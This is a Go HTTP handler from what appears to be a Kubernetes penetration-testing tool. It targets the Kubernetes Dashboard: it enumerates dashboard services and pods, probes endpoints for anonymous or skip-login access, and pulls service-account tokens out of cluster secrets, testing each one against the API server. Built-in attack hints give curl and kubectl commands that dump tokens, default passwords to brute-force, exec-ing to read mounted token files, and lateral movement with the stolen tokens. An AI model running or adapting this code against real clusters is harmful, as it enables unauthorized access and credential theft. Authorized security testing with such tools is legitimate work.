package handler

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

type DashboardHandler struct{}

func NewDashboardHandler() *DashboardHandler {
	return &DashboardHandler{}
}

func (h *DashboardHandler) buildClient(c *gin.Context) (*kubectl.Client, string, error) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		return nil, "", err
	}
	server := "https://" + req.TargetHost + ":6443"
	if req.Token != "" {
		client, err := kubectl.NewClient(server, req.Token, req.SkipTLS)
		return client, server, err
	}
	client, err := kubectl.NewClientWithUserPass(server, req.Username, req.Password, req.SkipTLS)
	return client, server, err
}

// ==================== Step 1: Discover Dashboard ====================

func (h *DashboardHandler) Discover(c *gin.Context) {
	client, server, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 15*time.Second)
	defer cancel()

	results := make([]gin.H, 0)
	dashboardServices := make([]gin.H, 0)

	// Method 1: Find kubernetes-dashboard service in all namespaces
	svcList, err := client.Clientset.CoreV1().Services("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, svc := range svcList.Items {
			if strings.Contains(strings.ToLower(svc.Name), "dashboard") ||
				strings.Contains(strings.ToLower(svc.Namespace), "dashboard") {
				ports := make([]string, 0)
				nodePorts := make([]int, 0)
				for _, p := range svc.Spec.Ports {
					ports = append(ports, fmt.Sprintf("%d/%s", p.Port, p.Protocol))
					if p.NodePort > 0 {
						nodePorts = append(nodePorts, int(p.NodePort))
					}
				}

				svcInfo := gin.H{
					"name":       svc.Name,
					"namespace":  svc.Namespace,
					"type":       string(svc.Spec.Type),
					"cluster_ip": svc.Spec.ClusterIP,
					"ports":      ports,
					"node_ports": nodePorts,
				}

				// Check for external access
				if svc.Spec.Type == "NodePort" && len(nodePorts) > 0 {
					svcInfo["access_url"] = fmt.Sprintf("https://NODE_IP:%d", nodePorts[0])
					svcInfo["access_type"] = "NodePort"
				} else if svc.Spec.Type == "LoadBalancer" {
					svcInfo["access_type"] = "LoadBalancer"
					if len(svc.Status.LoadBalancer.Ingress) > 0 {
						svcInfo["access_url"] = fmt.Sprintf("https://%s", svc.Status.LoadBalancer.Ingress[0].IP)
					}
				} else {
					svcInfo["access_url"] = fmt.Sprintf("https://%s:6443/api/v1/namespaces/%s/services/https:%s:/proxy/",
						strings.TrimPrefix(server, "https://"), svc.Namespace, svc.Name)
					svcInfo["access_type"] = "ClusterIP (use API proxy)"
				}

				dashboardServices = append(dashboardServices, svcInfo)
			}
		}
	}

	// Method 2: Find dashboard pods
	podList, _ := client.Clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
	dashboardPods := make([]gin.H, 0)
	if podList != nil {
		for _, pod := range podList.Items {
			for _, cnt := range pod.Spec.Containers {
				if strings.Contains(strings.ToLower(cnt.Image), "dashboard") {
					dashboardPods = append(dashboardPods, gin.H{
						"name":      pod.Name,
						"namespace": pod.Namespace,
						"node":      pod.Spec.NodeName,
						"image":     cnt.Image,
						"status":    string(pod.Status.Phase),
					})
					break
				}
			}
		}
	}

	// Method 3: Find dashboard deployments
	dashboardDeployments := make([]gin.H, 0)
	deployList, _ := client.Clientset.AppsV1().Deployments("").List(ctx, metav1.ListOptions{})
	if deployList != nil {
		for _, dep := range deployList.Items {
			if strings.Contains(strings.ToLower(dep.Name), "dashboard") {
				dashboardDeployments = append(dashboardDeployments, gin.H{
					"name":         dep.Name,
					"namespace":    dep.Namespace,
					"replicas":     *dep.Spec.Replicas,
					"ready":        dep.Status.ReadyReplicas,
					"dashboard_ns": dep.Namespace,
				})
			}
		}
	}

	// Method 4: Find dashboard ingresses
	ingressList, _ := client.Clientset.NetworkingV1().Ingresses("").List(ctx, metav1.ListOptions{})
	dashboardIngresses := make([]gin.H, 0)
	if ingressList != nil {
		for _, ing := range ingressList.Items {
			for _, rule := range ing.Spec.Rules {
				if strings.Contains(strings.ToLower(rule.Host), "dashboard") {
					paths := make([]string, 0)
					for _, p := range rule.HTTP.Paths {
						paths = append(paths, p.Path)
					}
					dashboardIngresses = append(dashboardIngresses, gin.H{
						"name":      ing.Name,
						"namespace": ing.Namespace,
						"host":      rule.Host,
						"paths":     paths,
					})
				}
			}
		}
	}

	results = append(results, dashboardServices...)
	results = append(results, dashboardPods...)

	exploitHints := h.generateDashboardHints(dashboardServices, dashboardPods)

	c.JSON(http.StatusOK, gin.H{
		"services":   dashboardServices,
		"pods":       dashboardPods,
		"deployments": dashboardDeployments,
		"ingresses":  dashboardIngresses,
		"total_svcs":  len(dashboardServices),
		"total_pods":  len(dashboardPods),
		"found":      len(dashboardServices) > 0 || len(dashboardPods) > 0,
		"exploit_hints": exploitHints,
	})
}

func (h *DashboardHandler) generateDashboardHints(services, pods []gin.H) []gin.H {
	hints := make([]gin.H, 0)

	if len(services) == 0 && len(pods) == 0 {
		hints = append(hints, gin.H{
			"step":    1,
			"title":   "Dashboard 未部署或名称被修改",
			"command": "搜索所有带有 'dashboard' 关键字的 Service/Deployment/Ingress",
			"method":  "手动检查所有 Service 名称",
		})
		return hints
	}

	hints = append(hints,
		gin.H{
			"step":  1,
			"title": "发现 Dashboard 访问入口",
			"desc":  fmt.Sprintf("找到 %d 个 Service, %d 个 Pod", len(services), len(pods)),
		},
		gin.H{
			"step":    2,
			"title":   "探测认证机制",
			"command": "curl -sk https://<DASHBOARD_URL>/api/v1/csrftoken/login/",
			"desc":    "如果返回 token 且是公开接口，可能存在 --enable-skip-login 绕过",
		},
		gin.H{
			"step":    3,
			"title":   "提取 Dashboard ServiceAccount Token",
			"command": "kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa kubernetes-dashboard -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d",
			"desc":    "使用 API 访问 /api/v1/namespaces/<NS>/secrets 提取 SA Token 直接登录",
		},
		gin.H{
			"step":    4,
			"title":   "尝试匿名访问",
			"command": "curl -sk https://<DASHBOARD_URL>/api/v1/",
			"desc":    "某些旧版本 Dashboard (1.7-) 默认允许匿名访问",
		},
		gin.H{
			"step":    5,
			"title":   "Brute Force / 默认凭据",
			"desc":    "尝试常见弱密码: admin/admin, kubernetes/admin, admin/password",
		},
		gin.H{
			"step":    6,
			"title":   "通过 Dashboard 执行命令",
			"command": "登录 Dashboard → 进入 Pod 详情 → 点击 Exec → 运行 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' 获取更多 Token",
			"desc":    "Dashboard 内置 WebSocket exec 功能，可直接在浏览器中执行命令",
		},
	)

	return hints
}

// ==================== Step 2: Probe Dashboard Accessibility ====================

type dashboardProbeRequest struct {
	TargetHost    string `json:"target_host" binding:"required"`
	DashboardPort int    `json:"dashboard_port"`
	DashboardPath string `json:"dashboard_path"`
	SkipTLS       bool   `json:"skip_tls"`
	TimeoutSec    int    `json:"timeout_sec"`
}

func (h *DashboardHandler) Probe(c *gin.Context) {
	var req dashboardProbeRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.DashboardPort == 0 {
		req.DashboardPort = 443
	}
	if req.DashboardPath == "" {
		req.DashboardPath = "/"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 8
	}

	httpClient := util.BuildHTTPClient(req.SkipTLS, req.TimeoutSec)

	// Test paths
	paths := []string{
		"/",
		"/api/v1/",
		"/api/v1/csrftoken/login/",
		"/api/v1/namespaces",
	}

	// Also test common ports for non-443
	ports := []int{req.DashboardPort}
	if req.DashboardPort == 443 {
		ports = append(ports, 8443, 30000, 30001)
	}

	results := make([]gin.H, 0)
	accessible := false
	var accessibleURL, version string

	for _, port := range ports {
		scheme := "https"
		if port == 30000 || port == 30001 {
			scheme = "http" // some old dashboards on NodePort
		}

		for _, path := range paths {
			url := fmt.Sprintf("%s://%s:%d%s", scheme, req.TargetHost, port, path)
			resp, err := httpClient.Get(url)
			if err != nil {
				continue
			}
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			bodyStr := string(body)

			result := gin.H{
				"url":         url,
				"status_code": resp.StatusCode,
				"content_type": resp.Header.Get("Content-Type"),
				"body_preview": truncate(bodyStr, 500),
			}

			// Detect dashboard
			if strings.Contains(bodyStr, "kubernetes-dashboard") ||
				strings.Contains(bodyStr, "Dashboard") ||
				strings.Contains(bodyStr, "k8s-dashboard") ||
				strings.Contains(bodyStr, "KDASH") {

				result["is_dashboard"] = true
				result["accessible"] = true
				accessible = true
				accessibleURL = url

				// Try to detect version
				re := regexp.MustCompile(`v(\d+\.\d+\.\d+)`)
				if match := re.FindStringSubmatch(bodyStr); len(match) > 1 {
					version = match[1]
					result["version"] = version
				}

				// Check for login skip
				if path == "/api/v1/" && resp.StatusCode == 200 {
					result["auth_bypass_possible"] = "Dashboard API accessible without authentication"
				}
			}

			// Check for skip-login page
			if strings.Contains(bodyStr, "skip") || strings.Contains(bodyStr, "Skip") {
				result["skip_login_available"] = true
			}

			results = append(results, result)
		}
	}

	// Try anonymous access to K8s API through potential API proxy
	if accessible && strings.Contains(accessibleURL, "/namespaces") {
		result := gin.H{
			"accessible":     true,
			"url":            accessibleURL,
			"version":        version,
			"probe_results":  results,
			"attack_steps":   h.getAttackSteps(req.TargetHost),
		}
		c.JSON(http.StatusOK, result)
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"accessible":      accessible,
		"url":             accessibleURL,
		"version":         version,
		"probe_results":   results,
		"attack_steps":    h.getAttackSteps(req.TargetHost),
		"discovery_count": len(results),
	})
}

func (h *DashboardHandler) getAttackSteps(targetHost string) []gin.H {
	saExtractCmd := fmt.Sprintf(
		"curl -sk https://%s:6443/api/v1/namespaces/kubernetes-dashboard/secrets | python3 -c \"import sys,json;d=json.load(sys.stdin);[print(s['metadata']['name'],'->',s.get('data',{}).get('token','')[:20]+'...') for s in d.get('items',[])]\" || echo '需要 Python3'",
		targetHost,
	)

	return []gin.H{
		{"step": 1, "title": "尝试匿名访问", "desc": "curl -sk <DASHBOARD_URL>/api/v1/"},
		{"step": 2, "title": "查找 Dashboard SA Token", "desc": saExtractCmd},
		{"step": 3, "title": "提取 Token 并登录", "desc": "使用上一步获取的 Token 在 Dashboard 登录页面粘贴"},
		{"step": 4, "title": "通过 Dashboard Exec 获取凭据", "desc": "登录后进入 Pod → Exec → cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
		{"step": 5, "title": "使用获取的凭据横向移动", "desc": "将 Token 填入平台顶部输入框，切换目标凭据"},
	}
}

// ==================== Step 3: Extract Dashboard SA Token via API ====================

func (h *DashboardHandler) ExtractToken(c *gin.Context) {
	client, _, err := h.buildClient(c)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()

	// Search all namespaces for dashboard-related service accounts
	dashboardNamespaces := []string{"kubernetes-dashboard", "kube-system", "default"}
	tokens := make([]gin.H, 0)

	for _, ns := range dashboardNamespaces {
		// Get service accounts
		saList, err := client.Clientset.CoreV1().ServiceAccounts(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, sa := range saList.Items {
			if !strings.Contains(strings.ToLower(sa.Name), "dashboard") &&
				!strings.Contains(strings.ToLower(ns), "dashboard") {
				continue
			}

			// Get secrets for this SA
			secretList, err := client.Clientset.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}

			for _, secret := range secretList.Items {
				if secret.Type != corev1.SecretTypeServiceAccountToken {
					continue
				}
				// Check if this secret belongs to the dashboard SA
				if !strings.Contains(secret.Name, sa.Name) &&
					!strings.Contains(secret.Name, "dashboard") {
					continue
				}

				token, ok := secret.Data["token"]
				if !ok {
					continue
				}
				tokenStr := string(token)

				// Validate token by testing on API server
				tokenValid := false
				testClient, testErr := kubectl.NewClient(
					fmt.Sprintf("https://%s:6443", c.GetString("target_host")),
					tokenStr,
					true,
				)
				if testErr == nil {
					_, testErr = testClient.Clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
					tokenValid = (testErr == nil)
				}

				tokens = append(tokens, gin.H{
					"namespace":    ns,
					"sa_name":      sa.Name,
					"secret_name":  secret.Name,
					"token":        tokenStr,
					"token_valid":  tokenValid,
					"token_length": len(tokenStr),
					"hint":         "将 Token 粘贴到 Dashboard 登录页面的 Token 输入框",
				})
			}
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"tokens":      tokens,
		"total":       len(tokens),
		"valid_count": countValidTokens(tokens),
		"instruction": "使用上方 Token 直接登录 Dashboard。如果没有找到，尝试在 Exec Tab 中对 dashboard pod 执行 'ls /var/run/secrets/kubernetes.io/serviceaccount/' 获取 SA Token",
	})
}

func countValidTokens(tokens []gin.H) int {
	n := 0
	for _, t := range tokens {
		if valid, ok := t["token_valid"].(bool); ok && valid {
			n++
		}
	}
	return n
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
